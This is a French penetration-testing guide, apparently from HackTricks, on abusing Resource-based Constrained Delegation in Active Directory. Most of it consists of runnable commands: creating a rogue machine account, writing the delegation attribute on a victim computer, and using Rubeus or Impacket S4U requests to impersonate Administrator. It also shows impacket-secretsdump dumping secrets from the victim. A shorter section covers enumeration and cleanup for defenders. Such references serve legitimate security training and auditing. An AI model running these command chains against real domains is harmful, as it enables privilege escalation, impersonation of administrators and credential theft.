# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Notions de base de Resource-based Constrained Delegation

Ceci est similaire à la [Constrained Delegation](constrained-delegation.md) basique mais **au lieu** de donner des permissions à un **objet** pour **usurper n'importe quel utilisateur contre une machine**, Resource-based Constrained Delegation **définit** dans **l'objet qui est capable d'usurper n'importe quel utilisateur contre lui**.

Dans ce cas, l'objet contraint aura un attribut appelé _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ avec le nom de l'utilisateur qui peut usurper n'importe quel autre utilisateur contre lui.

Une autre différence importante entre cette Constrained Delegation et les autres délégations est que n'importe quel utilisateur ayant des **permissions d'écriture sur un compte Machine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) peut définir le **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (Dans les autres formes de Delegation vous aviez besoin des privilèges domain admin).

### Nouveaux concepts

Dans la Constrained Delegation on disait que le flag **`TrustedToAuthForDelegation`** dans la valeur _userAccountControl_ de l'utilisateur est nécessaire pour effectuer un **S4U2Self.** Mais ce n'est pas totalement vrai.\
La réalité est que même sans cette valeur, vous pouvez effectuer un **S4U2Self** contre n'importe quel utilisateur si vous êtes un **service** (avez un SPN) mais, si vous **avez `TrustedToAuthForDelegation`** le TGS retourné sera **Forwardable** et si vous **n'avez pas** ce flag le TGS retourné **ne sera pas** **Forwardable**.

Cependant, si le **TGS** utilisé dans **S4U2Proxy** n'est **PAS Forwardable**, essayer d'abuser d'une **basic Constrain Delegation** **ne fonctionnera pas**. Mais si vous essayez d'exploiter une **Resource-Based constrain delegation**, cela fonctionnera.

### Structure de l'attaque

> Si vous avez des **privilèges équivalents d'écriture** sur un compte **Computer** vous pouvez obtenir un **accès privilégié** sur cette machine.

Supposons que l'attaquant possède déjà des **privilèges équivalents d'écriture sur l'ordinateur victime**.

1. L'attaquant **compromet** un compte qui a un **SPN** ou **en crée un** (“Service A”). Notez que **n'importe quel** _Admin User_ sans aucun autre privilège spécial peut **créer** jusqu'à 10 objets Computer (**_MachineAccountQuota_**) et leur assigner un **SPN**. Donc l'attaquant peut simplement créer un objet Computer et définir un SPN.
2. L'attaquant **abuse de son privilège WRITE** sur l'ordinateur victime (ServiceB) pour configurer **resource-based constrained delegation afin de permettre à ServiceA d'usurper n'importe quel utilisateur** contre cet ordinateur victime (ServiceB).
3. L'attaquant utilise Rubeus pour effectuer une **full S4U attack** (S4U2Self et S4U2Proxy) de Service A vers Service B pour un utilisateur **ayant un accès privilégié à Service B**.
1. S4U2Self (depuis le compte SPN compromis/créé) : Demander un **TGS d'Administrator vers moi** (Not Forwardable).
2. S4U2Proxy : Utiliser le **TGS non Forwardable** de l'étape précédente pour demander un **TGS** de **Administrator** vers l'**hôte victime**.
3. Même si vous utilisez un TGS non Forwardable, comme vous exploitez une resource-based constrained delegation, cela fonctionnera.
4. L'attaquant peut **pass-the-ticket** et **usurper** l'utilisateur pour obtenir **l'accès au ServiceB victime**.

Pour vérifier le _**MachineAccountQuota**_ du domaine vous pouvez utiliser :
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Attaque

### Création d'un objet ordinateur

Vous pouvez créer un objet ordinateur dans le domaine en utilisant **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configuration de la délégation restreinte basée sur les ressources

**Utilisation du module PowerShell activedirectory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Utilisation de powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Exécution complète d'une attaque S4U (Windows/Rubeus)

Tout d'abord, nous avons créé le nouvel Computer object avec le password `123456`, donc nous avons besoin du hash de ce password :
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Cela affichera les hachages RC4 et AES pour ce compte.\
L'attaque peut maintenant être effectuée :
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Vous pouvez générer des tickets supplémentaires pour plusieurs services en une seule requête en utilisant le paramètre `/altservice` de Rubeus :
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Attention : les utilisateurs possèdent un attribut appelé "**Cannot be delegated**". Si un utilisateur a cet attribut à True, vous ne pourrez pas vous faire passer pour lui. Cette propriété peut être consultée dans bloodhound.
 
### Outils Linux : RBCD de bout en bout avec Impacket (2024+)

Si vous opérez depuis Linux, vous pouvez effectuer la chaîne RBCD complète en utilisant les outils officiels Impacket :
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Remarques
- Si LDAP signing/LDAPS est exigé, utilisez `impacket-rbcd -use-ldaps ...`.
- Privilégiez les clés AES ; de nombreux domaines modernes restreignent RC4. Impacket et Rubeus prennent tous deux en charge des flux AES uniquement.
- Impacket peut réécrire le `sname` ("AnySPN") pour certains outils, mais obtenez le SPN correct autant que possible (p.ex., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Accès

La dernière ligne de commande exécutera l'**attaque S4U complète et injectera le TGS** de Administrator sur la machine victime en **mémoire**.\
Dans cet exemple, un TGS pour le service **CIFS** a été demandé depuis Administrator, vous pourrez donc accéder à **C$** :
```bash
ls \\victim.domain.local\C$
```
### Abuser de différents tickets de service

En savoir plus sur les [**available service tickets here**](silver-ticket.md#available-services).

## Énumération, audit et nettoyage

### Énumérer les ordinateurs avec RBCD configurés

PowerShell (décodage du SD pour résoudre les SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (read or flush with one command):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Nettoyage / réinitialisation RBCD

- PowerShell (effacer l'attribut):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Erreurs Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Cela signifie que Kerberos est configuré pour ne pas utiliser DES ou RC4 et que vous fournissez uniquement le hash RC4. Fournissez à Rubeus au moins le hash AES256 (ou fournissez-lui simplement les hashes rc4, aes128 et aes256). Exemple : `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Cela signifie que l'heure de l'ordinateur courant est différente de celle du DC et que Kerberos ne fonctionne pas correctement.
- **`preauth_failed`**: Cela signifie que le couple username + hashes fourni ne permet pas la connexion. Vous avez peut‑être oublié d'ajouter le "$" à l'intérieur du nom d'utilisateur lors de la génération des hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Cela peut signifier :
  - L'utilisateur que vous essayez d'usurper ne peut pas accéder au service désiré (parce que vous ne pouvez pas l'usurper ou parce qu'il n'a pas les privilèges suffisants)
  - Le service demandé n'existe pas (si vous demandez un ticket pour winrm mais que winrm n'est pas en cours d'exécution)
  - Le fakecomputer créé a perdu ses privilèges sur le serveur vulnérable et vous devez les lui redonner.
  - Vous abusez du KCD classique ; souvenez‑vous que RBCD fonctionne avec des tickets S4U2Self non‑forwardable, tandis que KCD requiert des tickets forwardable.

## Notes, relais et alternatives

- Vous pouvez aussi écrire le RBCD SD via AD Web Services (ADWS) si LDAP est filtré. Voir :


{{#ref}}
adws-enumeration.md
{{#endref}}

- Les chaînes de Kerberos relay se terminent fréquemment par RBCD pour obtenir SYSTEM local en une seule étape. Voir des exemples pratiques bout à bout :


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Si LDAP signing/channel binding sont **désactivés** et que vous pouvez créer un compte machine, des outils comme **KrbRelayUp** peuvent relayer une authentification Kerberos coercée vers LDAP, définir `msDS-AllowedToActOnBehalfOfOtherIdentity` pour votre compte machine sur l'objet ordinateur cible, et immédiatement usurper **Administrator** via S4U depuis l'extérieur de l'hôte.

## Références

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
